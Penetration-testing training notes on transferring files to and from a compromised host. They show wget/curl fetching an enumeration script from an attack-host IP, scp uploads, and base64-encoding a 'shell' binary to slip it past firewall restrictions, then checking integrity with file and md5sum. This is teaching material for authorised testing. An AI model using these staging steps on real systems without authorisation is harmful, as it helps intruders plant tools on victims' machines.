# Transferring Files

## Overview

During a pentest we often need to transfer files to a remote server (enumeration scripts, exploits) or pull data back to our attack host. A standard reverse shell has no built-in upload/download command (unlike Meterpreter), so we need alternative transfer methods.

## Learning Objectives

- Serve and fetch files with a Python HTTP server plus wget/curl
- Transfer files over SSH with scp
- Move files through a connection that blocks direct transfers, using base64 encoding
- Validate a transferred file's type and integrity

## HTTP Transfers (wget/curl)

Run a simple Python HTTP server on our machine, in the directory containing the file to serve:

```bash
cd /tmp
python3 -m http.server 8000
```

On the remote host, fetch it with wget, or curl if wget isn't available:

```bash
wget http://10.10.14.1:8000/linenum.sh
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

## SCP

If we already have SSH credentials on the remote host, scp is the most direct option:

```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

## Base64 Encoding Trick

When direct transfer isn't possible — for example, a firewall blocking outbound downloads — base64-encode the file locally:

```bash
base64 shell -w 0
```

`-w 0` disables line wrapping so the output is a single unbroken string. Copy that string, then on the remote host decode it back into a file:

```bash
echo <base64string> | base64 -d > shell
```

## Validating Transfers

After any transfer, confirm the file arrived intact:

```bash
file shell
```

For example, `ELF 64-bit LSB executable` confirms a correctly transferred binary. To check for corruption during the encode/decode round trip, compare hashes on both machines:

```bash
md5sum shell
```

Matching hashes on both ends confirm the file transferred without corruption.

## Skills Practiced

- Serving files over HTTP and fetching them with wget/curl
- Authenticated file transfer with scp
- Base64 encode/decode transfer through a restrictive shell
- File type and integrity validation

## Key Takeaways

- Always have a fallback transfer method ready — not every reverse shell has internet access or a usable download utility.
- The base64 trick works through almost any text-based shell, at the cost of being slow and memory-heavy for large files.
- Never assume a transfer succeeded cleanly — `file` and `md5sum` take seconds and catch truncated or corrupted transfers before they cause confusing downstream failures.
